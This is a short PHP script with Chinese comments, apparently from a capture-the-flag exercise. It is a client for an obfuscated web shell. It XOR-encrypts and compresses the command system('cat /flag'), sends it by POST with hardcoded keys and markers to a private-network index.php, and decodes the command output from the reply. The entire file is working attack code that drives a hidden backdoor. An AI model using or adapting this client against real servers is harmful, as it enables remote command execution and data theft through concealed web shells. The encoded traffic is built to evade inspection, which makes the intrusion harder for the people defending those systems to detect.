<?php
# 仅供参考 不建议直接使用

// 构建EXP的参数
$k = "7ccf8192";
$kh = "528271413977";
$kf = "f541527062a9";
$p = "ie3xNV9ea8twe7wl";

// 自定义加解密函数
function x($t, $k){
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}


$cmd = 'system("cat /flag");';

$payload = base64_encode(x(gzcompress($cmd), $k));

$data = "$kh$payload$kf";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://192.168.1.60:32919/index.php"); 
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);

if (preg_match("/$p$kh(.+)$kf/", $response, $m)) {
    $result = gzuncompress(x(base64_decode($m[1]), $k));
    echo "执行结果: \n" . $result . "\n";
}
?>
